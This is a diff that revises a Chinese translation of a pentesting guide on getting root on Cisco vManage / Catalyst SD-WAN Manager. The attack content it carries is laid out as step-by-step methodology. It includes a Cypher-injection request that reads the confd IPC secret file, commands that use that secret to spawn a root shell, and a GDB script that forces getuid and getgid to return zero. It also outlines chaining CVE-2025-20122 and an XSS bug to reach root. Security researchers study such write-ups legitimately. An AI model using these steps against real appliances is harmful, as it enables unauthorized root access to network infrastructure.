@@ -6,13 +6,13 @@
 
 (示例来自 [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))
 
-在查阅了一些与 `confd` 及不同二进制文件相关的 [documentation](http://66.218.245.39/doc/html/rn03re18.html)（可通过在 Cisco 网站上的账户访问）后，我们发现用于对 IPC socket 进行认证的密钥位于 `/etc/confd/confd_ipc_secret`：
+在查看了一些与 `confd` 和不同二进制文件相关的 [documentation](http://66.218.245.39/doc/html/rn03re18.html)（可通过 Cisco 网站的账户访问）之后，我们发现为了对 IPC socket 进行认证，它使用了位于 `/etc/confd/confd_ipc_secret` 的一个 secret：
 ```
 vmanage:~$ ls -al /etc/confd/confd_ipc_secret
 
 -rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
 ```
-还记得我们的 Neo4j 实例吗？它以 `vmanage` 用户的权限运行，因此允许我们利用之前的漏洞检索该文件：
+还记得我们的 Neo4j 实例吗？它在 `vmanage` 用户权限下运行，因此允许我们利用之前的漏洞检索该文件：
 ```
 GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1
 
@@ -24,7 +24,7 @@ Host: vmanage-XXXXXX.viptela.net
 
 "data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
 ```
-`confd_cli` 程序不支持命令行参数，但会以参数调用 `/usr/bin/confd_cli_user`。因此，我们可以直接用自己的参数调用 `/usr/bin/confd_cli_user`。不过在当前权限下它不可读，所以我们必须从 rootfs 中把它取出并用 scp 复制，查看它的帮助，并用它来获取 shell：
+`confd_cli` 程序不支持命令行参数，但会以参数调用 `/usr/bin/confd_cli_user`。因此，我们可以直接用自己的参数调用 `/usr/bin/confd_cli_user`。然而以当前权限无法读取它，所以必须从 rootfs 中取出并用 scp 复制，查看帮助，然后用它获取 shell：
 ```
 vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret
 
@@ -46,9 +46,9 @@ uid=0(root) gid=0(root) groups=0(root)
 
 (示例来自 [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))
 
-synacktiv 团队的博客¹ 描述了一种优雅的方法来获取 root shell，但该方法的缺点是需要获取只对 root 可读的 `/usr/bin/confd_cli_user` 的一份拷贝。我找到了一种无需此类麻烦即可提权到 root 的方法。
+该由 synacktiv 团队撰写的博客¹ 描述了一种获得 root shell 的优雅方法，但缺点是它需要获取 `/usr/bin/confd_cli_user` 的副本，而该文件只有 root 可读。我找到了另一种无需此麻烦即可提权到 root 的方法。
 
-当我反汇编 `/usr/bin/confd_cli` 二进制文件时，我观察到以下内容：
+当我反汇编 `/usr/bin/confd_cli` 二进制文件时，我观察到如下：
 
 <details>
 <summary>Objdump 显示 UID/GID 收集</summary>
@@ -82,20 +82,20 @@ vmanage:~$ objdump -d /usr/bin/confd_cli
 ```
 </details>
 
-当我运行 “ps aux” 时，我观察到以下内容 (_note -g 100 -u 107_)
+当我运行 “ps aux”, 我观察到以下内容 (_注意 -g 100 -u 107_)
 ```
 vmanage:~$ ps aux
 … snipped …
 root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
 … snipped …
 ```
-我假设“confd_cli”程序会将从已登录用户收集到的用户 ID 和组 ID 传递给“cmdptywrapper”应用。
+我推测 “confd_cli” 程序会把从已登录用户收集到的用户 ID 和组 ID 传给 “cmdptywrapper” 应用。
 
-我的第一次尝试是直接运行“cmdptywrapper”并向其提供`-g 0 -u 0`，但失败了。看起来在某处创建了一个文件描述符（-i 1015），我无法伪造它。
+我最初的尝试是直接运行 “cmdptywrapper” 并传入 `-g 0 -u 0`，但失败了。看来在某处创建了一个文件描述符（-i 1015），我无法伪造它。
 
 正如 synacktiv’s blog（最后一个示例）中提到的，`confd_cli` 程序不支持命令行参数，但我可以用调试器影响它，幸运的是系统中包含了 GDB。
 
-我编写了一个 GDB 脚本，强制 API `getuid` 和 `getgid` 返回 0。由于我已经通过 deserialization RCE 获得了“vmanage”权限，我可以直接读取 `/etc/confd/confd_ipc_secret`。
+我创建了一个 GDB 脚本，强制 API `getuid` 和 `getgid` 返回 0。由于我已经通过 deserialization RCE 拥有 “vmanage” 权限，我可以直接读取 `/etc/confd/confd_ipc_secret`。
 
 root.gdb:
 ```
@@ -115,7 +115,7 @@ root
 end
 run
 ```
-控制台输出：
+控制台输出:
 
 <details>
 <summary>控制台输出</summary>
@@ -154,19 +154,19 @@ bash-4.4#
 ```
 </details>
 
-## Path 3 (2025 CLI 输入验证漏洞)
+## 路径 3 (2025 CLI input validation bug)
 
-Cisco 将 vManage 更名为 *Catalyst SD-WAN Manager*，但底层 CLI 仍在同一台机器上运行。2025 年的一则公告 (CVE-2025-20122) 描述了 CLI 中的输入验证不足，该漏洞允许 **任何经过身份验证的本地用户** 通过向 manager CLI 服务发送精心构造的请求获得 root。将任何低权限立足点（例如 Path1 中的 Neo4j 反序列化，或 cron/backup 用户 shell）与此缺陷结合，即可在不复制 `confd_cli_user` 或附加 GDB 的情况下提升到 root：
+Cisco 把 vManage 重命名为 *Catalyst SD-WAN Manager*，但底层的 CLI 仍然在同一台机器上运行。一个 2025 年的咨询 (CVE-2025-20122) 描述了 CLI 中的输入验证不足，允许 **any authenticated local user** 通过向 manager CLI 服务发送精心构造的请求来获得 root。将任何 low-priv foothold（例如来自 Path1 的 Neo4j deserialization，或一个 cron/backup user shell）与此缺陷结合，即可在不复制 `confd_cli_user` 或附加 GDB 的情况下直接提权到 root：
 
-1. 使用你的低权限 shell 定位 CLI 的 IPC 端点（通常为 Path2 中在端口 4565 上显示的 `cmdptywrapper` 监听器）。
-2. 构造一个将 UID/GID 字段伪造为 0 的 CLI 请求。验证漏洞未能强制使用原始调用者的 UID，因此 wrapper 会启动一个以 root 身份支持的 PTY。
-3. 通过伪造的请求将任意命令序列（`vshell; id`）管道进去以获取 root shell。
+1. 使用你的 low-priv shell 定位 CLI 的 IPC 端点（通常是 Path2 中在端口 4565 上显示的 `cmdptywrapper` listener）。
+2. 构造一个 CLI 请求，将 UID/GID 字段伪造为 0。验证漏洞未能强制使用原始调用者的 UID，因此 wrapper 会启动一个以 root 支持的 PTY。
+3. 将任意命令序列（`vshell; id`）通过伪造的请求管道传入以获取 root shell。
 
-> 该利用面仅限本地；要取得初始 shell 仍需要远程代码执行，但一旦进入主机，利用只需发送一条 IPC 消息，而不必通过调试器补丁 UID。
+> 利用面仅限本地；remote code execution 仍然是获得初始 shell 的前提，但一旦进入机器，利用只需发送一条 IPC 消息，而不是通过 debugger-based UID patch。
 
-## Other recent vManage/Catalyst SD-WAN Manager vulns to chain
+## 其他近期可用于链式利用的 vManage/Catalyst SD-WAN Manager 漏洞
 
-* **Authenticated UI XSS (CVE-2024-20475)** – Inject JavaScript in specific interface fields; stealing an admin session gives you a browser-driven path to `vshell` → local shell → Path3 for root.
+* **Authenticated UI XSS (CVE-2024-20475)** – 在特定界面字段注入 JavaScript；窃取 admin session 会给你一条通过浏览器驱动的路径到 `vshell` → local shell → Path3 获取 root。
 
 ## References
 
